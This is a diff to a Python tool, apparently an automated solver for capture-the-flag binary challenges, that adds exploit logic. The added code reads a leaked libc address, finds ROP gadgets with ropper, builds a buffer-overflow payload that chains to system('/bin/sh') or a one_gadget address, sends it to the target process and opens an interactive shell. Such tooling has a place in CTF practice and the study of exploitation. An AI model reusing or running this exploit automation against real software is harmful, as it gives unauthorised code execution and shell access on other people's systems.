@@ -23,21 +23,72 @@ class App:
         self.disassembly = {}
         self.pipe = rz.open(binary)
         self.elf = {}
+        self.pwnelf = ELF(binary, False)
+        self.pwnlibc = ELF((self.pwnelf.runpath + b"/libc.so.6").decode(), False)
         
         # initialize ropper & ropper service
-        rs = r.RopperService()
-        rs.addFile(binary)
-
-        self.ropper = r.Ropper(rs)
+        self.rs = r.RopperService()
+        self.rs.addFile(binary)
+        
+        self.rs.loadGadgetsFor()
 
         # analyze, put anything that depends on self.pipe after this line
         self.pipe.cmd("aaa")
         self.elf = self.pipe.cmd("aflj")
+        
+        one = self.find_one_gadget(binary)
+
+    # ================ SOLVE FUNCTIONS ===================
+
+    # in my test bins, one_gadget does not want to work
+    # ret2libc works though
+    def ret2one(self, binary, one):
+        io = process(binary) 
 
         vuln = json.loads(self.pipe.cmd("pdfj @ sym.vuln"))
-        self.find_given_leaks(vuln)
+        leaked_function = self.find_given_leaks(vuln)
+       
+        io.recvuntil(b"<<< Leak: ")
+        leak = io.recvline()
+        leak = int(leak[:-1], 16)
 
+        libcoff = leak - self.pwnlibc.sym[leaked_function]
+
+        print(f"[*] Libc offset: {hex(libcoff)}")
         
+        ret = None
+        pop_rdi = None
+
+        for file, gadget in self.rs.search(search="ret"):
+            if "ret;" in str(gadget):
+                ret = int(str(gadget).split(":")[0], 16)
+                break
+       
+        for file, gadget in self.rs.search(search="pop rdi"):
+            if "pop rdi; ret;" in str(gadget):
+                pop_rdi = int(str(gadget).split(":")[0], 16)
+                break
+
+        payload = self.find_overflow(binary)
+
+        if pop_rdi:
+            print("[*] Attempting ret2libc")
+            payload += p64(pop_rdi)
+            payload += p64(next(self.pwnlibc.search("/bin/sh")) + libcoff)
+            payload += p64(ret)
+            payload += p64(self.pwnlibc.sym["system"] + libcoff)
+
+        else: 
+            print("[*] Attempting one_gadget")
+            payload += p64(one[3] + libcoff)
+
+        io.sendlineafter(b">>>", payload)
+
+        io.interactive()
+         
+
+    # ======================= STATIC SECTION ==========================
+    
     # use checksec to see what protections are in the binary
     def get_protections(self, binary):
         protections = {
@@ -69,13 +120,7 @@ class App:
                 protections["offset"] = int(temp[-1][:-1], 16)
 
         return protections
-
-    # ======================= STATIC SECTION ==========================
     
-    # driver for anything needing disassembly
-    def handle_disassembly(self, binary):
-        pass
-
     # find given leaks and return the libc function that is leaked
     def find_given_leaks(self, function):
         # find where printf is called in a given function
@@ -248,7 +293,7 @@ class App:
             io = io.split("\n")[-2][-18:]
             os.remove(rand_name)
 
-            return "A" * (cyclic_find(int.to_bytes(int(io, 16), 8).decode('utf-8')[::-1][4:]) + 4)
+            return b"A" * (cyclic_find(int.to_bytes(int(io, 16), 8).decode('utf-8')[::-1][4:]) + 4)
 
         except:
             print("[!] Could not find overflow.")
@@ -268,6 +313,26 @@ class App:
 
 
     # =========================== SYMBOLIC SECTION =====================================
+
+    # ========================== ROP SECTION ==================================
+
+    # remember to have this only run once and store for all of binaries that need it
+    def find_one_gadget(self, binary):
+        addresses = []
+
+        io = subprocess.run([b"one_gadget", self.pwnelf.runpath + b"/libc.so.6"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
+        io = io.split(" ")
+
+        for alice in io:
+            if "0x" in alice and "-" not in alice and "+" not in alice:
+                if "\n" in alice:
+                    bob = alice.split("\n")
+                    addresses.append(int(bob[-1], 16))
+
+                else:
+                    addresses.append(int(alice, 16))
+
+        return addresses 
 
 if __name__ == "__main__":
     app = App(argv[1])
